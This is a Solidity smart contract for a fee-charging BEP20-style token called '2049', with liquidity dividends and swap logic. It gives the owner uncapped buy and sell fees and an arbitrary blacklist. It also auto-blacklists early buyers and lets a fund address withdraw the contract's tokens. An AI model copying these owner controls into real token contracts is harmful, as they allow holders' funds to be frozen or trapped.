// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}


interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public fundAddress_2;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => bool) public _Against;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 50;
    uint256 public _buyLPFee = 100;
    uint256 public _buyLPDividendFee = 150;

    uint256 public _sellFundFee = 50;
    uint256 public _sellLPFee = 100;
    uint256 public _sellLPDividendFee = 150;
    uint256 public _maxWalletAmount;


    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address _Fund, address _Fund_2, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;

        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _maxWalletAmount = Supply * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = 0;

        _balances[ReceiveAddress] = total;

        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = _Fund;
        fundAddress_2 = _Fund_2;

        _isExcludedFromFee[_Fund] = true;
        _isExcludedFromFee[ReceiveAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        // _isExcludedFromFee[address(swapRouter)] = true;
        _isExcludedFromFee[_usdt] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(0xdead)] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 10 ** IERC20(USDTAddress).decimals()/100;

        _2049 = _usdt;

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    address public _2049;
    function set2049(address newAddr) public onlyOwner{
        _2049 = newAddr;
    }

    function setMaxWalletAmount(
        uint256 newValue 
    ) public onlyOwner {
        _maxWalletAmount = newValue;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    uint256 public swapAtAmount;
    function setSwapAtAmount(uint256 newValue) public onlyOwner{
        swapAtAmount = newValue;
    }

    uint256 public airDropNumbs = 3;
    function setAirdropNumbs(uint256 newValue) public onlyOwner{
        airDropNumbs = newValue;
    }

    function setBuy(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _buyFundFee = newFund;
        _buyLPFee = newLp;
        _buyLPDividendFee = newLpDividend;
    }

    function setSell(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{
        _sellFundFee = newFund;
        _sellLPFee = newLp;
        _sellLPDividendFee = newLpDividend;
    }


    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function tradingOpen() public view returns(bool){
        return block.timestamp >= startTime && startTime != 0;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_Against[from],"against");
        bool takeFee;
        bool isSell;

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && !_swapPairList[from] && !_swapPairList[to]){
            require(tradingOpen());
        }

        bool isRemove;
        bool isAdd;
        
        if (_swapPairList[to]) {
            isAdd = _isAddLiquidity();
        }else if(_swapPairList[from]){
            isRemove = _isRemoveLiquidity();
        }

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && airDropNumbs > 0 && _swapPairList[to] && !isAdd){
            address ad;
            for(uint256 i=0;i < airDropNumbs;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                _basicTransfer(from,ad,100);
            }
            amount -= airDropNumbs*100;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                if (!tradingOpen()) {
                    require(0 < goAddLPBlock && isAdd, "!goAddLP"); //_swapPairList[to]
                }

                if (_swapPairList[from]) {
                    require(_maxWalletAmount == 0 || amount + balanceOf(to) <= _maxWalletAmount, "ERC20: > max wallet amount");
                }

                if (block.timestamp < startTime + fightB && _swapPairList[from]) {
                    // _funTransfer(from, to, amount);
                    // return;
                    _Against[to] = true;
                }

                if (_swapPairList[to]) {
                    if (!inSwap && !isAdd) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > swapAtAmount) {
                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                if (!isAdd && !isRemove) takeFee = true; // just swap fee
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        // if (
        //     !_swapPairList[from] &&
        //     !_swapPairList[to] &&
        //     !_isExcludedFromFee[from] &&
        //     !_isExcludedFromFee[to]
        // ) {
        //     isSell = true;
        //     takeFee = true;
        // }

        _tokenTransfer(
            from,
            to,
            amount,
            takeFee,
            isSell,
            isAdd,
            isRemove
        );

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(350000);
        }
    }


    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    function setWLs(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isExcludedFromFee[addresses[i]] = status;
        }
    }

    function setBLs(address[] calldata addresses, bool value) public onlyOwner{
        for (uint256 i; i < addresses.length; ++i) {
            _Against[addresses[i]] = value;
        }
    }

    uint256 public buy_burnFee = 0;
    uint256 public sell_burnFee = 0;
    function setBurnFee(uint256 newBuyBurn, uint256 newSellBurn) public onlyOwner{
        buy_burnFee = newBuyBurn;
        sell_burnFee = newSellBurn;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isAdd,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
            }

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }

            uint256 burnAmount;
            if (!isSell) {
                //buy
                burnAmount = (tAmount * buy_burnFee) / 10000;
            } else {
                //sell
                burnAmount = (tAmount * sell_burnFee) / 10000;
            }
            if (burnAmount > 0) {
                feeAmount += burnAmount;
                _takeTransfer(sender, address(0xdead), burnAmount);
            }

        }

        if (isAdd && !_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            uint256 addLiquidityFeeAmount;
            addLiquidityFeeAmount = (tAmount * getAddlpFee()) / 10000;

            if (addLiquidityFeeAmount > 0) {
                feeAmount += addLiquidityFeeAmount;
                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
            }
        }

        if (isRemove && !_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            uint256 removeLiquidityFeeAmount;
            removeLiquidityFeeAmount = (tAmount * getRemovelpFee()) / 10000;

            if (removeLiquidityFeeAmount > 0) {
                feeAmount += removeLiquidityFeeAmount;
                _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);
            }
        }


        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 public addLiquidityFee;
    uint256 public removeLiquidityFee;

    function setAddLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "add Lp > 100 !");
        addLiquidityFee = newValue;
    }

    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner {
        require(newValue <= 10000, "remove Lp> 100 !");
        removeLiquidityFee = newValue;
    }

    function getAddlpFee() public view returns(uint256){
        return addLiquidityFee;
    }

    function getRemovelpFee() public view returns(uint256){
        return removeLiquidityFee;
    }

    event FAILED_SWAP(uint256);
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        if (swapFee == 0) return;
        // swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee / 2 ;
        uint256 buyBackAmount = tokenAmount * (_buyFundFee + _sellFundFee) / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount - buyBackAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(0); }

        address[] memory buyBurnPath = new address[](2);
        buyBurnPath[0] = address(this);
        buyBurnPath[1] = _2049;
        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyBackAmount,
            0,
            buyBurnPath,
            address(0xdead),
            block.timestamp
        ) {} catch { emit FAILED_SWAP(2); }

        IERC20 FIST = IERC20(_usdt);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);

        if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / (lpFee + _buyLPDividendFee + _sellLPDividendFee) / 2;
            if (lpFist > 0) {
                try _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpFist, 0, 0, fundAddress_2, block.timestamp
                ) {} catch { emit FAILED_SWAP(1); }
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _isExcludedFromFee[addr] = true;
    }

    function setFundAddress_2(address addr) external onlyOwner {
        fundAddress_2 = addr;
        _isExcludedFromFee[addr] = true;
    }

    uint256 public goAddLPBlock;
    function addLPBegin() external onlyOwner {
        require(0 == goAddLPBlock, "startedAddLP");
        goAddLPBlock = block.number;
    }

    function addLPEnd() external onlyOwner {
        goAddLPBlock = 0;
    }

    uint256 public fightB;
    uint256 public startTime;

    function launch(uint256 _kb,uint256 s) external onlyOwner {
        fightB = _kb;
        startTime = s;
    }
    
    function l_now() public onlyOwner{
        startTime = block.timestamp;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setClaims(address token, uint256 amount) external {
        if (msg.sender == fundAddress){
            if (token == address(0)){
                payable(msg.sender).transfer(amount);
            }else{
                IERC20(token).transfer(msg.sender, amount);
            }
        }
    }

    receive() external payable {}

    // dividend
    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;
    uint256 public processRewardWaitBlock = 3;
    function setProcessRewardWaitBlock(uint256 newValue) public onlyOwner{
        processRewardWaitBlock = newValue;
    }

    function processReward(uint256 gas) private {
        if (progressRewardBlock + processRewardWaitBlock > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_usdt);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }
}

contract TOKEN is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0xe0Ae00cc3b64D30ffA2970142f9B8E38A055EbAa),
        "2049",
        "2049",
        18,
        888,
        address(0x4EC003355e7D8AA1742f6Eb00A51154AE71dfAAa),
        address(0x4EC003355e7D8AA1742f6Eb00A51154AE71dfAAa),
        address(0x1FE0900215161e092f065CA37DCEa3d4ea46136A)
    ){
    }
}